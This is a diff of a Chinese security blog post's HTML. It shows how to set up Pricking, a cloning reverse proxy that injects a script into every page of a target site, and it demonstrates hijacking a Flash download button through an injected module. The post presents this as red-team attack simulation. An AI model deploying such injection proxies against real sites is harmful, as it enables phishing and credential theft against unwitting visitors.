-</code></pre><p>环境：</p><ul><li>反向代理服务器：MacOS 64Bit 192.168.117.1</li><li>目标域名：https://payloads.online</li></ul><p>配置文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>filter_type</span>:
+</span></span></code></pre></td></tr></table></div></div><h3 id=pricking-使用>Pricking 使用</h3><p>有Go语言环境 - 本地编译：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ git clone https://github.com/Rvn0xsy/Pricking
+</span></span><span style=display:flex><span>$ cd Pricking
+</span></span><span style=display:flex><span>$ make
+</span></span></code></pre></td></tr></table></div></div><p>有Go语言环境 - Go Install：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ go install -v github.com/Rvn0xsy/Pricking/cmd/pricking@latest
+</span></span></code></pre></td></tr></table></div></div><p>环境：</p><ul><li>反向代理服务器：MacOS 64Bit 192.168.117.1</li><li>目标域名：https://payloads.online</li></ul><p>配置文件：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>filter_type</span>:
 </span></span><span style=display:flex><span>  - <span style=color:#e6db74>&#34;text/html&#34;</span> <span style=color:#75715e># 仅针对网页内容进行注入</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>exclude_file</span>:   <span style=color:#75715e># 静态文件的数据包不进行注入</span>
 </span></span><span style=display:flex><span>  - <span style=color:#e6db74>&#34;.jpg&#34;</span>
@@ -269,9 +540,27 @@ $ make
 </span></span><span style=display:flex><span><span style=color:#f92672>pricking_prefix_url</span>: <span style=color:#e6db74>&#34;/pricking_static_files&#34;</span> <span style=color:#75715e># 静态目录名，不能与目标网站冲突</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>listen_address</span>: <span style=color:#e6db74>&#34;192.168.117.1:9999&#34;</span> <span style=color:#75715e># 监听地址:端口</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>inject_body</span>: <span style=color:#e6db74>&#34;&lt;script src=&#39;/pricking_static_files/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;</span> <span style=color:#75715e># 注入代码</span>
-</span></span></code></pre></div><p>Pricking是支持HTTPS反向代理的，我的博客刚好是HTTPS加密的，所以能把HTTPS转换为HTTP。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-00-37.png alt></p></p><p>启动Pricking，<strong>确保配置文件、Static在当前目录</strong>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./pricking -url https://payloads.online
+</span></span></code></pre></td></tr></table></div></div><p>Pricking是支持HTTPS反向代理的，我的博客刚好是HTTPS加密的，所以能把HTTPS转换为HTTP。</p><p><img src=https://images.payloads.online/2021-12-24-14-00-37.png alt></p><p>启动Pricking，<strong>确保配置文件、Static在当前目录</strong>：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./pricking -url https://payloads.online
 </span></span><span style=display:flex><span>2021/12/24 14:03:33 Loading config  ./config.yaml
-</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-10-18.png alt></p></p><p>代理效果：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-05-09.png alt></p></p><p>查看页面底部：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-06-25.png alt></p></p><p>代码已经成功注入，<a href=https://github.com/Rvn0xsy/Pricking/tree/main/static>static.js</a>中的代码就是用于引用<a href=https://github.com/Rvn0xsy/Pricking/tree/main/static>Pricking Js Suite</a>的内容进行加载执行。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-14-00.png alt></p></p><h2 id=0x04-nodejs实现---快速部署与完美克隆>0x04 NodeJS实现 - 快速部署与完美克隆</h2><p><a href=https://github.com/Rvn0xsy/Pricking-node>Pricking-node</a> 实现效果与<a href=https://github.com/Rvn0xsy/Pricking>Pricking</a>类似，但我感觉JS好像更加简洁、方便，因此对照<a href=https://www.npmjs.com/package/http-proxy-middleware>http-proxy-middleware</a>模块编写了一个反向代理脚本。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>createProxyMiddleware</span>, <span style=color:#a6e22e>responseInterceptor</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;http-proxy-middleware&#39;</span>);
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/2021-12-24-14-10-18.png alt></p><p>代理效果：</p><p><img src=https://images.payloads.online/2021-12-24-14-05-09.png alt></p><p>查看页面底部：</p><p><img src=https://images.payloads.online/2021-12-24-14-06-25.png alt></p><p>代码已经成功注入，<a href=https://github.com/Rvn0xsy/Pricking/tree/main/static>static.js</a>中的代码就是用于引用<a href=https://github.com/Rvn0xsy/Pricking/tree/main/static>Pricking Js Suite</a>的内容进行加载执行。</p><p><img src=https://images.payloads.online/2021-12-24-14-14-00.png alt></p><h2 id=0x04-nodejs实现---快速部署与完美克隆>0x04 NodeJS实现 - 快速部署与完美克隆</h2><p><a href=https://github.com/Rvn0xsy/Pricking-node>Pricking-node</a> 实现效果与<a href=https://github.com/Rvn0xsy/Pricking>Pricking</a>类似，但我感觉JS好像更加简洁、方便，因此对照<a href=https://www.npmjs.com/package/http-proxy-middleware>http-proxy-middleware</a>模块编写了一个反向代理脚本。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>createProxyMiddleware</span>, <span style=color:#a6e22e>responseInterceptor</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;http-proxy-middleware&#39;</span>);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>proxy</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>createProxyMiddleware</span>({
 </span></span><span style=display:flex><span>  <span style=color:#75715e>/**
@@ -287,13 +576,28 @@ $ make
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>&#39;Hello&#39;</span>, <span style=color:#e6db74>&#39;Goodbye&#39;</span>); <span style=color:#75715e>// manipulate response and return the result
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }),
 </span></span><span style=display:flex><span>});
-</span></span></code></pre></div><p>通过onProxyRes属性可以定义针对Response的修改动作。</p><h3 id=pricking-node-使用>Pricking-node 使用</h3><pre tabindex=0><code>$ npm install -g express
-$ npm install -g http-proxy-middleware
-$ git clone https://github.com/Rvn0xsy/Pricking-node.git
-$ cd Pricking-node
-$ node proxy.js
-</code></pre><p>可以通过环境变量改变默认值：</p><table><thead><tr><th>环境变量</th><th>默认值</th></tr></thead><tbody><tr><td>HOST</td><td><a href=https://payloads.online/>https://payloads.online/</a></td></tr><tr><td>PORT</td><td>3000</td></tr><tr><td>PUBLIC_URI</td><td>/public</td></tr><tr><td>PUBLIC_DIR</td><td>pricking-js-suite</td></tr></tbody></table><h3 id=劫持flash下载>劫持Flash下载</h3><p><a href=https://github.com/Rvn0xsy/Pricking-node/blob/main/pricking-js-suite/modules/flash.cn.js>劫持Flash的代码</a>已经提交到pricking-js-suite，在这里我演示一下：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-04-52.png alt></p></p><p>将flash模块启用：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ vim pricking-js-suite/static.js
-</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-07-50.png alt></p></p><p>访问: http://localhost:3000 点击立即下载将会触发js代码。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-09-42.png alt></p></p><p>flash模块的代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Loaded flash.cn Module ...&#34;</span>);
+</span></span></code></pre></td></tr></table></div></div><p>通过onProxyRes属性可以定义针对Response的修改动作。</p><h3 id=pricking-node-使用>Pricking-node 使用</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ npm install -g express
+</span></span><span style=display:flex><span>$ npm install -g http-proxy-middleware
+</span></span><span style=display:flex><span>$ git clone https://github.com/Rvn0xsy/Pricking-node.git
+</span></span><span style=display:flex><span>$ cd Pricking-node
+</span></span><span style=display:flex><span>$ node proxy.js
+</span></span></code></pre></td></tr></table></div></div><p>可以通过环境变量改变默认值：</p><table><thead><tr><th>环境变量</th><th>默认值</th></tr></thead><tbody><tr><td>HOST</td><td><a href=https://payloads.online/>https://payloads.online/</a></td></tr><tr><td>PORT</td><td>3000</td></tr><tr><td>PUBLIC_URI</td><td>/public</td></tr><tr><td>PUBLIC_DIR</td><td>pricking-js-suite</td></tr></tbody></table><h3 id=劫持flash下载>劫持Flash下载</h3><p><a href=https://github.com/Rvn0xsy/Pricking-node/blob/main/pricking-js-suite/modules/flash.cn.js>劫持Flash的代码</a>已经提交到pricking-js-suite，在这里我演示一下：</p><p><img src=https://images.payloads.online/2021-12-31-13-04-52.png alt></p><p>将flash模块启用：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ vim pricking-js-suite/static.js
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/2021-12-31-13-07-50.png alt></p><p>访问: http://localhost:3000 点击立即下载将会触发js代码。</p><p><img src=https://images.payloads.online/2021-12-31-13-09-42.png alt></p><p>flash模块的代码如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Loaded flash.cn Module ...&#34;</span>);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>Download</span>() {
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>loadLink</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementsByClassName</span>(<span style=color:#e6db74>&#34;loadLink&#34;</span>);
@@ -302,6 +606,4 @@ $ node proxy.js
 </span></span><span style=display:flex><span>        <span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#34;Hello Pricking!!&#34;</span>);
 </span></span><span style=display:flex><span>    },<span style=color:#66d9ef>false</span>)
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h2 id=参考>参考</h2><ul><li><a href=https://github.com/openresty/docker-openresty>https://github.com/openresty/docker-openresty</a></li><li><a href=https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/>https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/</a></li><li><a href=https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/>https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/</a></li><li><a href=https://www.freecodecamp.org/news/learn-modern-javascript/>https://www.freecodecamp.org/news/learn-modern-javascript/</a></li><li><a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import</a></li><li><a href=https://blog.joshsoftware.com/2021/05/25/simple-and-powerful-reverseproxy-in-go/>https://blog.joshsoftware.com/2021/05/25/simple-and-powerful-reverseproxy-in-go/</a></li><li><a href=https://www.npmjs.com/package/http-proxy-middleware>https://www.npmjs.com/package/http-proxy-middleware</a></li></ul></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
-to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
-<script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
+</span></span></code></pre></td></tr></table></div></div><h2 id=参考>参考</h2><ul><li><a href=https://github.com/openresty/docker-openresty>https://github.com/openresty/docker-openresty</a></li><li><a href=https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/>https://openresty-reference.readthedocs.io/en/latest/Lua_Nginx_API/</a></li><li><a href=https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/>https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/</a></li><li><a href=https://www.freecodecamp.org/news/learn-modern-javascript/>https://www.freecodecamp.org/news/learn-modern-javascript/</a></li><li><a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import</a></li><li><a href=https://blog.joshsoftware.com/2021/05/25/simple-and-powerful-reverseproxy-in-go/>https://blog.joshsoftware.com/2021/05/25/simple-and-powerful-reverseproxy-in-go/</a></li><li><a href=https://www.npmjs.com/package/http-proxy-middleware>https://www.npmjs.com/package/http-proxy-middleware</a></li></ul></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-实现目标>0x01 实现目标</a></li><li><a href=#0x02-nginx实现---快速部署与完美克隆>0x02 Nginx实现 - 快速部署与完美克隆</a><ol><li><a href=#openresty配置文件>OpenResty配置文件</a></li><li><a href=#openresty---lua-ngx-api>OpenResty - Lua Ngx API</a></li><li><a href=#lua-ngx-api---block>Lua Ngx API - Block</a></li><li><a href=#nginx-反向代理配置>Nginx 反向代理配置</a></li><li><a href=#注入模块化的evil-js>注入模块化的Evil JS</a></li><li><a href=#使用es6标准将js模块化>使用ES6+标准将JS模块化</a></li><li><a href=#nginx---记录日志或凭证>Nginx - 记录日志或凭证</a></li><li><a href=#nginx---最终配置>Nginx - 最终配置</a></li><li><a href=#nginx---dockerfile编写>Nginx - Dockerfile编写</a></li><li><a href=#nginx---docker-compose>Nginx - docker-compose</a></li></ol></li><li><a href=#0x03-golang实现---快速部署与完美克隆>0x03 Golang实现 - 快速部署与完美克隆</a><ol><li><a href=#修改响应内容>修改响应内容</a></li><li><a href=#pricking-使用>Pricking 使用</a></li></ol></li><li><a href=#0x04-nodejs实现---快速部署与完美克隆>0x04 NodeJS实现 - 快速部署与完美克隆</a><ol><li><a href=#pricking-node-使用>Pricking-node 使用</a></li><li><a href=#劫持flash下载>劫持Flash下载</a></li></ol></li><li><a href=#参考>参考</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2021 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do 